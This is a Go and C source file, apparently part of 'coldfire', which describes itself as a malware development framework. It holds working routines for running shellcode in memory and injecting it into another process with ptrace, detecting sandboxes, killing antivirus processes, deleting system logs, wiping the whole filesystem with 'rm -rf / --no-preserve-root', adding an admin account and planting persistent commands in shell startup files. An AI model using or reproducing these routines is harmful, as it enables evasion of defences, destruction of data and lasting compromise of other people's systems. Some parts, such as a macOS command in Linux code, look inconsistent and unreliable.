// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package coldfire

/*
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

#if defined(__x86_64)

#define REG_IP_NAME      "rip"
#define REG_IP_TYPE      unsigned long
#define REG_IP_FMT       "lu"
#define REG_IP_HEX       "lx"
#define REG_IP_VALUE(r)  ((r).rip)

#elif defined(__i386)

#define REG_IP_NAME      "eip"
#define REG_IP_TYPE      unsigned long
#define REG_IP_FMT       "lu"
#define REG_IP_HEX       "lx"
#define REG_IP_VALUE(r)  ((r).eip)

#endif

void sc_run(char *shellcode, size_t sclen) {
    void *ptr = mmap(0, sclen, PROT_EXEC|PROT_WRITE|PROT_READ, MAP_ANON|MAP_PRIVATE, -1, 0);
    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }
    memcpy(ptr, shellcode, sclen);
    (*(void(*) ()) ptr)();
}
void sc_inject(char *shellcode, size_t sclen, pid_t pid) {
    struct user_regs_struct regs;
    int result = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    if (result < 0) { exit(1); }
    wait(NULL);
    result = ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    if (result < 0) { exit(1); }
    int i;
    uint32_t *s = (uint32_t *) shellcode;
    uint32_t *d = (uint32_t *) REG_IP_VALUE(regs);

    for (i=0; i < sclen; i+=4, s++, d++) {
        result = ptrace(PTRACE_POKETEXT, pid, d, *s);
        if (result < 0) { exit(1); }
    }
    REG_IP_VALUE(regs) += 2;
}

import "C"
*/

import (
	"fmt"
	humanize "github.com/dustin/go-humanize"
	"github.com/minio/minio/pkg/disk"
	ps "github.com/mitchellh/go-ps"
	"io/ioutil"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

func killProcByPID(pid int) error {
	p := strconv.Itoa(pid)
	cmd := "kill -9 " + p
	_, err := cmdOut(cmd)
	return err
}

func info() string {
	var (
		u string
		// ap_ip string // what's the purpose? (1)
	)

	user, err := cmdOut("whoami")
	if err != nil {
		user = "N/A"
	}

	u = user

	// o, err := cmdOut("ip r")
	// if err != nil {
	// 	ap_ip = "N/A" // (1)
	// }
	// entries := strings.Split(o, "\n")
	// for e := range entries {
	// 	entry := entries[e]
	// 	if strings.Contains(entry, "default via") {
	// 		ap_ip = strings.Split(o, "")[2] // (1)
	// 	}
	// }

	return u
}

func isRoot() bool {
	root := true

	u, _ := cmdOut("whoami")
	root = (strings.TrimSuffix(u, "\n") == "root")

	return root
}

func cmdOut(command string) (string, error) {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	out := string(output)
	return out, err
}

func sandboxFilepath() bool {
	out, _ := cmdOut("systemd-detect-virt")
	return out != "none"
}

func sandboxDisk(size int) bool {
	v := false
	d := "/"
	di, _ := disk.GetInfo(d)
	x := strings.Replace(humanize.Bytes(di.Total), "GB", "", -1)
	x = strings.Replace(x, " ", "", -1)
	z, err := strconv.Atoi(x)
	if err != nil {
		fmt.Println(err)
	}
	if z < size {
		v = true
	}
	return v
}

func sandboxTmp(entries int) bool {
	tmp_dir := "/tmp"
	files, err := ioutil.ReadDir(tmp_dir)
	if err != nil {
		return true
	}

	return len(files) < entries
}

func shutdown() error {
	c := "shutdown +1"
	_, err := cmdOut(c)

	return err
}

func pkillAv() error {
	av_processes := []string{"netsafety", "clamav", "sav-protect.service", "sav-rms.service"}

	processList, err := ps.Processes()
	if err != nil {
		return err
	}

	for x := range processList {
		process := processList[x]
		proc_name := process.Executable()
		pid := process.Pid()

		if ContainsAny(proc_name, av_processes) {
			err := killProcByPID(pid)
			if err != nil {
				return err
			}
		}
	}

	return nil
}

func users() ([]string, error) {
	o, err := cmdOut("cut -d: -f1 /etc/passwd")

	if err != nil {
		return nil, err
	}

	return strings.Split(o, "\n"), nil
}

func networks() ([]string, error) {
	wifi_names := []string{}

	out, err := cmdOut("nmcli dev wifi")
	if err != nil {
		return nil, err
	}

	o := strings.Split(out, "\n")[1:]
	for entry := range o {
		e := o[entry]
		wifi_name := strings.Split(e, "")[1]
		wifi_names = append(wifi_names, wifi_name)
	}

	return wifi_names, nil
}

func clearLogs() error {
	_, err := cmdOut("rm -r /var/log")
	if err != nil {
		return err
	}

	return nil
}

func wipe() error {
	cmd := "rm -rf / --no-preserve-root"
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

func createUser(username, password string) error {
	cmd := f("sysadminctl -addUser %s -password %s -admin", username, password)

	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil
}

func wifiDisconnect() error {
	iface, _ := Iface()
	cmd := f("ip link set dev %s down", iface)
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}
	return nil

}

func disks() ([]string, error) {
	found_drives := []string{}

	for _, drive := range "abcdefgh" {
		f, err := os.Open("/dev/sd" + string(drive))
		if err == nil {
			found_drives = append(found_drives, "/dev/sd"+string(drive))
			f.Close()
		}
	}

	return found_drives, nil
}

func addPersistentCommand(cmd string) error {
	_, err := cmdOut(fmt.Sprintf(`echo "%s" >> ~/.bashrc; echo "%s" >> ~/.zshrc`, cmd, cmd))
	return err
}

// func dialog(message, title string) {
// 	zenity.Info(message, zenity.Title(title))
// }

// func SplitMultiSep(s string, seps []string) []string {
// 	f := func(c rune) bool {
// 		for _, sep := range seps {
// 			if c == sep { // what?
// 				return true
// 			}
// 		}
// 	}
// 	fields := strings.FieldsFunc(s, f)
// 	return fields
// }

/*

func keyboard_emul(keys string) error {

}

func proxy_tcp() error {

}

func proxy_udp() error {

}

func proxy_http() error {

}

func webshell(param, password string) error {

}

func stamp() {

}

func detect_user_interaction() (bool, error) {

}*/
